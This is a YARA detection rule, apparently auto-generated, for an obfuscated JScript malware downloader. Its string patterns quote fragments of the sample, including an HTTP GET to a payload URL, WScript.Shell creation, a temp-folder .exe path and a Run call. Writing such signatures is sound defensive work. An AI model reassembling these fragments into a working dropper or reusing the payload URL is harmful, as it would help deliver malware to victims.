rule sig_20160401_2ec6f84606f8e6ce4ce39a34526b0d68 {
  meta:
    description = "datamaliciousorder - file 20160401_2ec6f84606f8e6ce4ce39a34526b0d68.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "71e5218d3bb96ba3ac21f989f81c717b44f198365733ef63dec60b42223f72bc"

  strings:
    $s1  = "YdJk[KvYr](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "function DdOjt(HarDv, LhEbx){KfOh = KfOh * 1; return HarDv - LhEbx;};" fullword ascii
    $s3  = "var FghTy = function FbqMdc() {return WScript[ZldTm](\"WScript\"+\".Shell\");}(), UycPyx = 11;" fullword ascii
    $s4  = "if (YdJk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PhgEav(){return TvYl + \"\";};" fullword ascii
    $s6  = "function YzQu() {return FghTy[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fTORZZEFWSOFBFOL.ex\" + \"e\";};" fullword ascii
    $s7  = "function QcTle() {return ((EstWfg == true) && (EstWfg == PvlSp)) ? 1 : KfOh;};" fullword ascii
    $s8  = "function RjoPtj(MjVv) {var YrrRd = (1, 2, 3, 4, 5, MjVv); return YrrRd;};" fullword ascii
    $s9  = "var PvlSp = false;" fullword ascii
    $s10 = "return DdOjt(JrrZs, CclCb);" fullword ascii
    $s11 = "PvlSp = true; " fullword ascii
    $s12 = "function KaPk()" fullword ascii
    $s13 = "var UceThl = false;" fullword ascii
    $s14 = "function JlsLn(){return 23;};" fullword ascii
    $s15 = "EstWfg = true; " fullword ascii
    $s16 = "var SjAxt = new this[\"Date\"]();" fullword ascii
    $s17 = "var EstWfg = false;" fullword ascii
    $s18 = "}while (SlRxo);" fullword ascii
    $s19 = "function UdxIy(){return ZldTm;};" fullword ascii
    $s20 = "function ApoEe(NeYq){FghTy[\"R\"+\"un\"](NeYq, KfOh, KfOh);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}